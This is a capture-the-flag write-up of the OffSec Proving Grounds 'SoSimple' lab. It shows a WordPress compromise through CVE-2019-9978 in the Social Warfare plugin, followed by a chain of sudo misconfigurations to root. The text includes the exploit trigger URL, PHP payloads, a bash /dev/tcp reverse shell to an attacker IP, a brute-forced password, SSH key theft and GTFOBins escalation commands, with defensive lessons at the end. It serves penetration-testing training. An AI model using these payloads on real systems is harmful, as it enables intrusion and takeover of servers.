# 🧩 SoSimple — Proving Grounds Practice Writeup

> **Platform:** Offensive Security Proving Grounds Practice
> **Difficulty:** Intermediate
> **OS:** Linux (Ubuntu 20.04)
> **Author:** [Tanvir Ahmed](https://github.com/Tanvir-2) | [Portfolio](https://tanvirkarim.it)
> **Status:** ✅ Completed
> **Tags:** `Web` `WordPress` `wpscan` `Social Warfare` `CVE-2019-9978` `RCE` `SSH Key` `Sudo Abuse` `GTFOBins` `Privilege Escalation`

---

## 📋 Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [Web Enumeration](#web-enumeration)
4. [WordPress Enumeration](#wordpress-enumeration)
5. [Exploitation — Social Warfare RCE (CVE-2019-9978)](#exploitation--social-warfare-rce-cve-2019-9978)
6. [Initial Access](#initial-access)
7. [Privilege Escalation — Part 1: Leaked SSH Key → max](#privilege-escalation--part-1-leaked-ssh-key--max)
8. [Privilege Escalation — Part 2: max → steven (sudo service)](#privilege-escalation--part-2-max--steven-sudo-service)
9. [Privilege Escalation — Part 3: steven → root (writable script)](#privilege-escalation--part-3-steven--root-writable-script)
10. [Flags](#flags)
11. [Attack Chain](#-attack-chain)
12. [Skills Demonstrated](#-skills-demonstrated)
13. [Lessons Learned](#-lessons-learned)
14. [References](#references)
15. [Tools Used](#tools-used)

---

## 🧭 Lab Overview

| Field | Details |
|-------|---------|
| **Target IP** | `192.168.109.78` |
| **Hostname** | `so-simple` |
| **OS** | Ubuntu 20.04 Linux |
| **Difficulty** | Intermediate |
| **Focus Areas** | WordPress enumeration, vulnerable-plugin RCE, SSH key reuse, sudo misconfiguration |

**Lab Summary:**
SoSimple is an intermediate Linux box built around a WordPress installation. Directory brute-forcing locates the WordPress site; `wpscan` recovers a user's credentials and, more importantly, flags the outdated **Social Warfare** plugin (v3.5.0) vulnerable to **CVE-2019-9978** — an unauthenticated remote code execution. A reverse shell is obtained through that flaw, a leaked private SSH key grants access as `max`, and a two-stage **sudo misconfiguration** (`service` GTFOBins escape → a writable root-run script) escalates through `steven` to **root**.

---

## 🔍 Reconnaissance

### Port Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.109.78
```

![Nmap Scan Results](screenshots/01_nmap_scan.png)

### Results

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH — later reused with a leaked key |
| 80/tcp | HTTP | Apache — hosts the WordPress site |

The attack surface is a web server (port 80) plus SSH (port 22) for later reuse.

---

## 🌐 Web Enumeration

Directory brute-forcing against the web root located the WordPress CMS under `/wordpress/`.

```bash
gobuster dir -u http://192.168.109.78 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 40
```

![Gobuster WordPress Discovery](screenshots/02_gobuster.png)

> **💡 Finding:** The `/wordpress/` directory confirms a WordPress installation — the next step is WordPress-specific enumeration with `wpscan`.

---

## 📝 WordPress Enumeration

`wpscan` was run to enumerate users and plugins, and to brute-force the discovered user's password.

```bash
wpscan --url http://192.168.109.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt
```

![wpscan Enumeration](screenshots/03_wpscan.png)

**Results:**
- Valid user **`max`** identified
- Password brute-forced:

```
max : opensesame
```

Critically, `wpscan` also flagged a **vulnerable plugin**:

| Plugin | Version | Vulnerability |
|--------|---------|---------------|
| **Social Warfare** | 3.5.0 | CVE-2019-9978 — Unauthenticated RCE / stored XSS |

> **🎯 Key Pivot:** The WordPress admin panel offered no plugin/theme-editor route to a shell. The outdated **Social Warfare 3.5.0** plugin, however, is vulnerable to **CVE-2019-9978**, which allows unauthenticated remote code execution — the real way in.

---

## 💥 Exploitation — Social Warfare RCE (CVE-2019-9978)

### The Vulnerability

Social Warfare ≤ 3.5.2 mishandles the `swp_url` parameter of `admin-post.php`. When invoked with `swp_debug=load_options`, the plugin fetches the attacker-supplied URL and **evaluates PHP contained within `<pre>` tags** from the remote response — giving unauthenticated code execution.

**References:** [CVE-2019-9978](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978) · [hash3liZer/CVE-2019-9978](https://github.com/hash3liZer/CVE-2019-9978)

### Step 1 — Proof of Concept (read /etc/passwd)

Create a payload file containing PHP wrapped in `<pre>` tags:

```php
<pre>system('cat /etc/passwd')</pre>
```

Host it on the attacker machine:

```bash
# File: payload.txt
python3 -m http.server 80
```

Trigger the plugin to fetch and execute it:

```
http://192.168.109.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.166/payload.txt
```

![Social Warfare /etc/passwd Leak](screenshots/04_cve_passwd.png)

The response returns `/etc/passwd`, confirming code execution and revealing interactive users:

```
max:x:1000:1000:roel:/home/max:/bin/bash
steven:x:1001:1001:Steven,,,:/home/steven:/bin/bash
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
```

> **✅ RCE confirmed.** Three human users exist: `max`, `steven`, and `ubuntu` — useful targets for the privilege-escalation chain.

### Step 2 — Reverse Shell

Swap the PoC command for a bash reverse-shell one-liner in the payload, keeping the same `<pre>` wrapper:

```php
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.45.166/8080 0>&1'")</pre>
```

Start a listener:

```bash
nc -lvnp 8080
```

Re-trigger the plugin to fetch the updated payload:

```
http://192.168.109.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.166/payload.txt
```

![Reverse Shell Received](screenshots/05_revshell.png)

---

## 🚪 Initial Access

A reverse shell was received as the web user (`www-data`). The shell was stabilised and the local flag located during enumeration.

```bash
# stabilise the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Initial Shell & Local Flag](screenshots/06_local_txt.png)

```
local.txt: <paste value from your screenshot>
```

> **Note:** the `local.txt` value was not captured in the source notes — drop the exact string from your own screenshot here before publishing.

---

## 🔺 Privilege Escalation — Part 1: Leaked SSH Key → max

Enumerating the foothold revealed a readable **private SSH key**.

```bash
ls -la
cat .ssh/id_rsa
```

![Leaked SSH Private Key](screenshots/07_id_rsa.png)

The key was copied to the attacker machine, permissions tightened, and used to authenticate as **max** over SSH.

```bash
# on attacker: save the key as id_rsa1
chmod 600 id_rsa1
ssh max@192.168.109.78 -i id_rsa1
```

![SSH as max](screenshots/08_ssh_max.png)

> **🎯 Finding:** A private key left world-readable on the host allowed a clean, interactive login as `max` — a far more stable foothold than the `www-data` reverse shell.

---

## 🔺 Privilege Escalation — Part 2: max → steven (sudo service)

Checking `max`'s sudo rights revealed permission to run `/usr/sbin/service` **as the user `steven`**.

```bash
sudo -l
```

The `service` binary has a known [GTFOBins](https://gtfobins.github.io/gtfobins/service/) escape — invoking it with a relative path to a shell spawns that shell. Running it as `steven` yields a shell as `steven`:

```bash
sudo -u steven /usr/sbin/service ../../bin/bash
```

![max to steven via service](screenshots/09_service_steven.png)

```
steven@so-simple:/$ id
uid=1001(steven) gid=1001(steven) groups=1001(steven)
```

> **🎯 Finding:** `service` is on the GTFOBins list precisely because it executes a supplied script/binary. A `sudo` rule permitting it — even scoped to another non-root user — is a lateral-movement primitive.

---

## 🔺 Privilege Escalation — Part 3: steven → root (writable script)

As **steven**, `sudo -l` showed permission to run a script under `/opt/tools/` as **root** — but the `tools` directory did not exist. Since `/opt` was writable, the script path could simply be created and filled with a root shell.

```bash
sudo -l

# the /opt/tools directory is missing — create it and plant the script
cd /opt
mkdir tools
echo "/bin/bash" > tools/server-health.sh
chmod +x tools/server-health.sh
```

![Creating the root-run script](screenshots/10_opt_tools.png)

Executing the script through `sudo` runs `/bin/bash` as root:

```bash
sudo /opt/tools/server-health.sh
```

![Root Shell](screenshots/11_root_shell.png)

```
root@so-simple:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> **🏆 Root achieved.** A `sudo` rule pointing at a **non-existent script in a writable directory** is as dangerous as one pointing at a writable script — the attacker simply creates it.

---

## 🚩 Flags

```bash
# as root
cd /root
cat proof.txt
```

![Proof Flag](screenshots/12_proof_txt.png)

| Flag | Location | Value |
|------|----------|-------|
| **local.txt** | user home | *(paste from your screenshot)* |
| **proof.txt** | `/root/proof.txt` | *(paste from your screenshot)* |

> **Note:** both flag values were illegible/absent in the source OCR — fill them in from your own captures before publishing.

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                       SOSIMPLE — ATTACK CHAIN                          │
└─────────────────────────────────────────────────────────────────────────┘

[Attacker 192.168.45.166]
        │
        │ 1. Nmap → 22 (SSH), 80 (Apache)
        ▼
[Web :80]
        │
        │ 2. gobuster → /wordpress/ (WordPress CMS)
        ▼
[WordPress Enumeration]
        │
        │ 3. wpscan → user "max" ; brute-force → max:opensesame
        │ 4. wpscan → Social Warfare 3.5.0 (vulnerable)  ⭐
        ▼
[Exploitation — CVE-2019-9978]
        │
        │ 5. payload.txt = <pre>system('...')</pre> ; python3 http.server
        │ 6. admin-post.php?swp_debug=load_options&swp_url=<attacker>/payload.txt
        │ 7. PoC: cat /etc/passwd → users max, steven, ubuntu
        │ 8. swap in bash reverse shell → nc :8080
        ▼
[Initial Access — www-data]
        │
        │ 9. stabilise shell ; local.txt
        ▼
[Privesc 1 — leaked SSH key]
        │
        │ 10. cat .ssh/id_rsa → copy as id_rsa1 → chmod 600
        │ 11. ssh max@target -i id_rsa1  → user max
        ▼
[Privesc 2 — sudo service (GTFOBins)]
        │
        │ 12. sudo -l → (steven) /usr/sbin/service
        │ 13. sudo -u steven /usr/sbin/service ../../bin/bash → user steven
        ▼
[Privesc 3 — writable root-run script]
        │
        │ 14. sudo -l → (root) /opt/tools/server-health.sh  (missing)
        │ 15. mkdir /opt/tools ; echo /bin/bash > server-health.sh ; chmod +x
        │ 16. sudo /opt/tools/server-health.sh → uid=0(root)
        ▼
[Root]
        │
        │ 17. cat /root/proof.txt
        ▼
[🏆 PWNED]
```

---

## 🛡️ Skills Demonstrated

| # | Skill | MITRE ATT&CK Technique | TTP ID |
|---|-------|------------------------|--------|
| 1 | Port scanning & service enumeration | Network Service Discovery | T1046 |
| 2 | Web directory brute-forcing | Active Scanning: Wordlist Scanning | T1595.003 |
| 3 | WordPress user/plugin enumeration (wpscan) | Active Scanning | T1595 |
| 4 | Password brute-forcing | Brute Force: Password Guessing | T1110.001 |
| 5 | Vulnerable-plugin RCE (CVE-2019-9978) | Exploit Public-Facing Application | T1190 |
| 6 | Hosting & delivering a remote payload | Ingress Tool Transfer | T1105 |
| 7 | Reverse shell / command execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| 8 | Credential/key discovery (private SSH key) | Unsecured Credentials: Private Keys | T1552.004 |
| 9 | SSH key-based access | Remote Services: SSH | T1021.004 |
| 10 | Sudo enumeration | System Owner/User Discovery | T1033 |
| 11 | sudo `service` GTFOBins escape (lateral) | Abuse Elevation Control: Sudo | T1548.003 |
| 12 | Writable root-run script → root | Abuse Elevation Control: Sudo | T1548.003 |

---

## 📚 Lessons Learned

### 🔴 Offensive Perspective

1. **wpscan tells you two things — use both.** It handed over a crackable credential *and* a vulnerable plugin. When the admin panel is a dead end, the plugin inventory is the real attack surface — always cross-reference plugin versions against public CVEs.

2. **Outdated plugins are the WordPress kill-switch.** Social Warfare 3.5.0 → CVE-2019-9978 is unauthenticated RCE. The `<pre>system(...)</pre>` + `swp_url` primitive is trivial to weaponise once the version is known.

3. **Always hunt for private keys after a foothold.** A world-readable `id_rsa` turned a fragile `www-data` web shell into a stable, interactive `max` session over SSH — better persistence and a cleaner base for privesc.

4. **`sudo -l` at every hop.** The escalation was a three-link chain (`www-data` → `max` → `steven` → `root`), and each link was a separate sudo rule. Re-enumerate sudo rights after *every* user switch.

5. **A missing sudo target is still exploitable.** `sudo` permission on a script in a writable directory is game over even when the script doesn't exist yet — you simply create it. GTFOBins (`service`) and writable-path rules are the two most common Linux sudo primitives.

### 🔵 Defensive Perspective

1. **Patch and inventory WordPress plugins.** Social Warfare 3.5.0 has a years-old public RCE. Enforce automatic plugin updates, remove unused plugins, and monitor for known-vulnerable versions. A WAF rule blocking the `swp_url` pattern would have stopped this outright.

2. **Enforce strong WordPress passwords & limit login attempts.** `opensesame` fell instantly to `rockyou.txt`. Require strong passwords, MFA, and login rate-limiting.

3. **Never leave private keys on disk unprotected.** SSH private keys must be `600`, owned by their user, and never readable by the web server. Audit home directories and web roots for stray key material.

4. **Apply least privilege to sudo — and be specific.** Avoid granting `service` (and other GTFOBins binaries) via sudo. Point sudo rules only at root-owned, non-writable, fully-qualified scripts, and ensure those scripts (and their parent directories) cannot be created or modified by the invoking user.

5. **Lock down /opt and shared directories.** A writable `/opt` let a low-privilege user plant a root-run script. Shared directories referenced by privileged automation must not be writable by unprivileged accounts.

### 🟡 Key Takeaways

- **Version disclosure → public CVE → RCE** is the dominant WordPress compromise pattern.
- **Foothold user ≠ final user** — keys and credentials on the host often leapfrog you straight past the web user.
- **Sudo misconfigurations stack** — this box chained three of them into a full root path.
- **Writable-path sudo rules** (existing *or* missing targets) are among the most reliable Linux escalations.

---

## 📎 References

| Resource | URL |
|----------|-----|
| CVE-2019-9978 — Social Warfare RCE | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978 |
| PoC — hash3liZer/CVE-2019-9978 | https://github.com/hash3liZer/CVE-2019-9978 |
| GTFOBins — service | https://gtfobins.github.io/gtfobins/service/ |
| GTFOBins — Sudo | https://gtfobins.github.io/#+sudo |
| WPScan | https://github.com/wpscanteam/wpscan |
| MITRE ATT&CK — Exploit Public-Facing Application | https://attack.mitre.org/techniques/T1190/ |
| MITRE ATT&CK — Unsecured Credentials: Private Keys | https://attack.mitre.org/techniques/T1552/004/ |
| MITRE ATT&CK — Abuse Elevation Control: Sudo | https://attack.mitre.org/techniques/T1548/003/ |
| Offensive Security Proving Grounds | https://www.offsec.com/labs/individual/ |

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `gobuster` | Web directory brute-forcing |
| `wpscan` | WordPress user, plugin, and credential enumeration |
| `python3 -m http.server` | Hosting the CVE-2019-9978 payload |
| Web browser / `curl` | Triggering the Social Warfare RCE |
| `nc` (netcat) | Reverse-shell listener |
| `ssh` | Key-based access as max |
| GTFOBins (`service`) | Sudo lateral movement (max → steven) |

---

<div align="center">

**[⬅ Back to Portfolio](https://github.com/Tanvir-2) | [🌐 tanvirkarim.it](https://tanvirkarim.it)**

*SoSimple — Proving Grounds Practice | Intermediate | WordPress RCE → SSH Key → Sudo Chain → Root*

</div>
